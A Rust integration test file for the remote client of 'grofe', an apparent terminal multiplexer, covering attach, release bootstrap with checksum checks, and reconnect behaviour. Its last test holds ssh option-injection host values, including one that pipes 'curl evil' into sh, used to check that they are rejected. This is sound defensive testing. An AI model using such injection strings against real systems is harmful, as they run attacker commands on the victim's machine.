//! The remote client (spec ssh-remote §2): `grofe -r <host>` against a
//! real server, with no real ssh. `GROFE_SSH` names a fake ssh script that
//! ignores the host and runs the remote command locally, with the remote's
//! `HOME`, `PATH` and `$GROFE` (the server's private socket) baked in. It
//! answers `ssh -G` with ssh's unset keepalive default, writes the pid of
//! every proxy it runs to a file (so a test can kill or stop that one),
//! and fails like ssh (255) while a `down` file exists.

mod common;
#[path = "acceptance/harness.rs"]
#[allow(dead_code)]
mod harness;

use std::fs;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::time::{Duration, Instant};

use common::{CMD_TIMEOUT, TestServer, run_bounded};
use grofe::remote::bootstrap::{archive_name, hex, sha256};
use harness::Harness;
use nix::sys::signal::{Signal, kill};
use nix::unistd::Pid;
use tempfile::TempDir;

const VERSION: &str = env!("CARGO_PKG_VERSION");
const TARGETS: &[&str] = &[
    "x86_64-unknown-linux-musl",
    "aarch64-unknown-linux-musl",
    "aarch64-apple-darwin",
    "x86_64-apple-darwin",
];

/// The remote side: a server, a remote `HOME`, and the fake ssh.
struct Remote {
    srv: TestServer,
    dir: TempDir,
}

impl Remote {
    /// `grofe` on the remote `PATH` when `grofe_on_path`.
    fn new(grofe_on_path: bool) -> Remote {
        let srv = TestServer::start();
        let dir = tempfile::Builder::new()
            .prefix("grofe-rc")
            .tempdir()
            .expect("tempdir");
        let root = dir.path();
        for d in ["home", "bin", "local-home", "local-config"] {
            fs::create_dir_all(root.join(d)).unwrap();
        }
        if grofe_on_path {
            std::os::unix::fs::symlink(env!("CARGO_BIN_EXE_grofe"), root.join("bin/grofe"))
                .unwrap();
        }
        let script = format!(
            r#"#!/bin/sh
for a; do [ "$a" = -G ] && {{ echo "serveraliveinterval 0"; exit 0; }}; done
[ -e '{root}/down' ] && {{ echo "ssh: connect to host box: Connection refused" >&2; exit 255; }}
while [ $# -gt 0 ] && [ "$1" != -- ]; do shift; done
shift 2
case "$*" in *proxy*) echo $$ >> '{root}/proxies' ;; esac
export HOME='{root}/home' PATH='{root}/bin:/usr/bin:/bin' GROFE='{sock}'
export XDG_STATE_HOME='{state}' XDG_RUNTIME_DIR='{run}' XDG_CONFIG_HOME='{cfg}'
unset GROFE_PANE TMUX
exec /bin/sh -c "$*"
"#,
            root = root.display(),
            sock = srv.socket.display(),
            state = srv.state_home.display(),
            run = srv.runtime_dir.display(),
            cfg = srv.config_home.display(),
        );
        let ssh = root.join("ssh");
        fs::write(&ssh, script).unwrap();
        fs::set_permissions(&ssh, fs::Permissions::from_mode(0o755)).unwrap();
        Remote { srv, dir }
    }

    fn root(&self) -> &Path {
        self.dir.path()
    }

    /// A local `grofe -r box <args>` with the fake ssh and private dirs.
    fn client(&self, args: &[&str]) -> Command {
        let mut cmd = self.local(&["-r", "box"]);
        cmd.args(args);
        cmd
    }

    /// A local `grofe <args>` with the fake ssh and private dirs.
    fn local(&self, args: &[&str]) -> Command {
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_grofe"));
        cmd.args(args)
            .current_dir(self.root())
            .env_remove("GROFE")
            .env_remove("GROFE_PANE")
            .env_remove("TMUX")
            .env("GROFE_SSH", self.root().join("ssh"))
            .env("HOME", self.root().join("local-home"))
            .env("XDG_CONFIG_HOME", self.root().join("local-config"))
            .env("TERM", "xterm-256color")
            .env_remove("COLORTERM");
        cmd
    }

    fn attach(&self, args: &[&str], env: &[(&str, &str)]) -> Harness {
        let mut cmd = self.client(args);
        for (k, v) in env {
            cmd.env(k, v);
        }
        Harness::spawn(cmd, 80, 24)
    }

    /// The pid of the latest proxy the fake ssh ran, once there is a
    /// `n`th one.
    fn proxy(&self, n: usize) -> Pid {
        let path = self.root().join("proxies");
        let deadline = Instant::now() + CMD_TIMEOUT;
        loop {
            let pids: Vec<i32> = fs::read_to_string(&path)
                .unwrap_or_default()
                .lines()
                .filter_map(|l| l.trim().parse().ok())
                .collect();
            if pids.len() >= n {
                return Pid::from_raw(*pids.last().unwrap());
            }
            assert!(Instant::now() < deadline, "no proxy number {n}");
            std::thread::sleep(Duration::from_millis(20));
        }
    }

    fn set_down(&self, down: bool) {
        let f = self.root().join("down");
        if down {
            fs::write(f, "").unwrap();
        } else {
            let _ = fs::remove_file(f);
        }
    }

    fn installed(&self) -> PathBuf {
        self.root()
            .join(format!("home/.local/share/grofe/bin/{VERSION}/grofe"))
    }
}

#[test]
fn a_remote_one_shot_prints_like_the_local_cli() {
    let r = Remote::new(true);
    r.srv.cmd(&["new-session", "-d", "-s", "alpha"]).unwrap();
    let remote = run_bounded(r.client(&["list-sessions"]), CMD_TIMEOUT);
    let local = r.srv.run(&["list-sessions"]);
    assert!(remote.status.success(), "{remote:?}");
    assert_eq!(remote.stdout, local.stdout);

    let remote = run_bounded(r.client(&["has-session", "-t", "nope"]), CMD_TIMEOUT);
    let local = r.srv.run(&["has-session", "-t", "nope"]);
    assert_eq!(remote.status.code(), local.status.code());
    assert_eq!(remote.stderr, local.stderr);
}

#[test]
fn dash_r_attaches_to_main_and_shows_the_pane() {
    let r = Remote::new(true);
    let mut h = r.attach(&[], &[]);
    h.wait_for(common::PROMPT.trim());
    h.send("echo hello-remote\r");
    h.wait_for("hello-remote");
    assert!(r.srv.cmd(&["has-session", "-t", "main"]).is_ok());
    h.send("\x02d");
    h.wait_exit();
    assert!(String::from_utf8_lossy(h.output()).contains("[detached"));
}

#[test]
fn an_ssh_url_attaches_to_its_session() {
    let r = Remote::new(true);
    r.srv.cmd(&["new-session", "-d", "-s", "work"]).unwrap();
    r.srv
        .cmd(&["send-keys", "-t", "work", "echo in-work", "Enter"])
        .unwrap();
    let mut h = Harness::spawn(r.local(&["attach", "ssh://me@box:2222/work"]), 80, 24);
    h.wait_for("in-work");
    h.send("\x02d");
    h.wait_exit();
}

// ------------------------------------------------------------------ bootstrap

/// A release dir like the GitHub release: `v<version>/` with an archive
/// per target, each holding a `grofe` that runs this build, and
/// `SHA256SUMS`. `tamper` makes the sums wrong.
fn release_dir(root: &Path, tamper: bool) -> PathBuf {
    let base = root.join("release");
    let dir = base.join(format!("v{VERSION}"));
    fs::create_dir_all(&dir).unwrap();
    let mut sums = String::new();
    for target in TARGETS {
        let name = format!("grofe-v{VERSION}-{target}");
        let stage = root.join("stage").join(&name);
        fs::create_dir_all(&stage).unwrap();
        let bin = stage.join("grofe");
        fs::write(
            &bin,
            format!("#!/bin/sh\nexec '{}' \"$@\"\n", env!("CARGO_BIN_EXE_grofe")),
        )
        .unwrap();
        fs::set_permissions(&bin, fs::Permissions::from_mode(0o755)).unwrap();
        let archive = dir.join(archive_name(VERSION, target));
        let ok = Command::new("tar")
            .arg("czf")
            .arg(&archive)
            .arg("-C")
            .arg(root.join("stage"))
            .arg(&name)
            .status()
            .unwrap();
        assert!(ok.success());
        let mut sum = hex(&sha256(&fs::read(&archive).unwrap()));
        if tamper {
            sum = sum.replace(|c: char| c != '0', "0");
        }
        sums.push_str(&format!("{sum}  {}\n", archive_name(VERSION, target)));
    }
    fs::write(dir.join("SHA256SUMS"), sums).unwrap();
    base
}

#[test]
fn install_puts_the_release_on_a_remote_without_grofe() {
    let r = Remote::new(false);
    r.srv.cmd(&["new-session", "-d", "-s", "boot"]).unwrap();
    let release = release_dir(r.root(), false);
    let mut cmd = r.client(&["--install", "list-sessions"]);
    cmd.env("GROFE_REMOTE_RELEASE_URL", &release);
    let out = run_bounded(cmd, CMD_TIMEOUT);
    assert!(out.status.success(), "{out:?}");
    assert!(out.stdout.contains("boot:"), "{out:?}");
    assert!(
        out.stderr.contains("not the default release URL"),
        "{out:?}"
    );
    assert!(out.stderr.contains("installed"), "{out:?}");
    assert!(r.installed().is_file());
    // Now it is there: no install the second time.
    let out = run_bounded(r.client(&["list-sessions"]), CMD_TIMEOUT);
    assert!(out.status.success(), "{out:?}");
    assert!(!out.stderr.contains("installed"), "{out:?}");
}

#[test]
fn a_bad_checksum_installs_nothing() {
    let r = Remote::new(false);
    let release = release_dir(r.root(), true);
    let mut cmd = r.client(&["--install", "list-sessions"]);
    cmd.env(
        "GROFE_REMOTE_RELEASE_URL",
        format!("file://{}", release.display()),
    );
    let out = run_bounded(cmd, CMD_TIMEOUT);
    assert!(!out.status.success());
    assert!(out.stderr.contains("checksum mismatch"), "{out:?}");
    assert!(!r.installed().exists());
}

#[test]
fn no_install_and_no_terminal_refuse_with_the_way_out() {
    let r = Remote::new(false);
    for args in [&["--no-install", "list-sessions"][..], &["list-sessions"]] {
        let out = run_bounded(r.client(args), CMD_TIMEOUT);
        assert!(!out.status.success());
        assert!(out.stderr.contains("not installed"), "{out:?}");
        assert!(out.stderr.contains("--install"), "{out:?}");
    }
    assert!(!r.installed().exists());
}

#[test]
fn install_from_copies_a_local_file() {
    let r = Remote::new(false);
    r.srv.cmd(&["new-session", "-d", "-s", "gap"]).unwrap();
    let bin = r.root().join("mine");
    fs::write(
        &bin,
        format!("#!/bin/sh\nexec '{}' \"$@\"\n", env!("CARGO_BIN_EXE_grofe")),
    )
    .unwrap();
    let out = run_bounded(
        r.client(&["--install-from", bin.to_str().unwrap(), "list-sessions"]),
        CMD_TIMEOUT,
    );
    assert!(out.status.success(), "{out:?}");
    assert!(out.stdout.contains("gap:"));
    assert_eq!(fs::read(r.installed()).unwrap(), fs::read(&bin).unwrap());
}

// ------------------------------------------------------------------ reconnect

const BAR: &str = "reconnecting to box";

#[test]
fn a_killed_link_reconnects_and_redraws_what_happened_meanwhile() {
    let r = Remote::new(true);
    let mut h = r.attach(&[], &[]);
    h.wait_for(common::PROMPT.trim());
    h.send("echo before-drop\r");
    h.wait_for("before-drop");
    r.set_down(true);
    kill(r.proxy(1), Signal::SIGKILL).unwrap();
    h.wait_for(BAR);
    assert!(h.text().contains("before-drop"), "the last frame stays");
    // Typed while offline: dropped.
    h.send("lost-keys");
    r.srv
        .cmd(&["send-keys", "-t", "main", "echo while-away", "Enter"])
        .unwrap();
    r.set_down(false);
    h.wait_until(
        "the redraw after the reconnect",
        Duration::from_secs(20),
        |t| t.contains("while-away") && !t.contains(BAR),
    );
    assert!(!h.text().contains("lost-keys"));
    h.send("echo after-drop\r");
    h.wait_for("after-drop");
    h.send("\x02d");
    h.wait_exit();
}

#[test]
fn missed_pings_are_a_drop_that_reconnects() {
    let r = Remote::new(true);
    let mut h = r.attach(&[], &[("GROFE_TEST_PING_MS", "200")]);
    h.wait_for(common::PROMPT.trim());
    let stalled = r.proxy(1);
    kill(stalled, Signal::SIGSTOP).unwrap();
    h.wait_for(BAR);
    r.proxy(2);
    h.wait_until(
        "the bar gone after the reconnect",
        Duration::from_secs(20),
        |t| !t.contains(BAR),
    );
    h.send("echo pings-back\r");
    h.wait_for("pings-back");
    // The link drop killed the stalled proxy.
    let _ = kill(stalled, Signal::SIGKILL);
    h.send("\x02d");
    h.wait_exit();
}

#[test]
fn the_detach_key_ends_the_client_while_offline() {
    let r = Remote::new(true);
    let mut h = r.attach(&[], &[]);
    h.wait_for(common::PROMPT.trim());
    r.set_down(true);
    kill(r.proxy(1), Signal::SIGKILL).unwrap();
    h.wait_for(BAR);
    h.send("\x02d");
    h.wait_exit();
    assert!(String::from_utf8_lossy(h.output()).contains("[detached]"));
}

#[test]
fn remote_reconnect_off_exits_on_a_drop() {
    let r = Remote::new(true);
    let cfg = r.root().join("local-config/grofe");
    fs::create_dir_all(&cfg).unwrap();
    fs::write(cfg.join("config.toml"), "remote-reconnect = false\n").unwrap();
    let mut h = r.attach(&[], &[]);
    h.wait_for(common::PROMPT.trim());
    kill(r.proxy(1), Signal::SIGKILL).unwrap();
    h.wait_exit();
    let out = String::from_utf8_lossy(h.output()).into_owned();
    assert!(out.contains("lost server"), "{out}");
    assert!(!out.contains(BAR));
}

// ------------------------------------------------------------------ hostile targets

/// A host or URL that ssh could read as an option is refused before ssh
/// ever runs.
#[test]
fn hosts_that_look_like_ssh_options_never_reach_ssh() {
    let r = Remote::new(true);
    let runs = [
        r.local(&["-r", "-oProxyCommand=touch pwned", "list-sessions"]),
        r.local(&["-r", "-oFoo", "list-sessions"]),
        r.local(&["attach", "ssh://-oProxyCommand=curl evil|sh"]),
        r.local(&["attach", "ssh://-oX=y@h"]),
    ];
    for cmd in runs {
        let out = run_bounded(cmd, CMD_TIMEOUT);
        assert!(!out.status.success(), "{out:?}");
        assert!(out.stderr.contains("starts with -"), "{out:?}");
    }
    assert!(!r.root().join("proxies").exists());
    assert!(!r.root().join("pwned").exists());
}
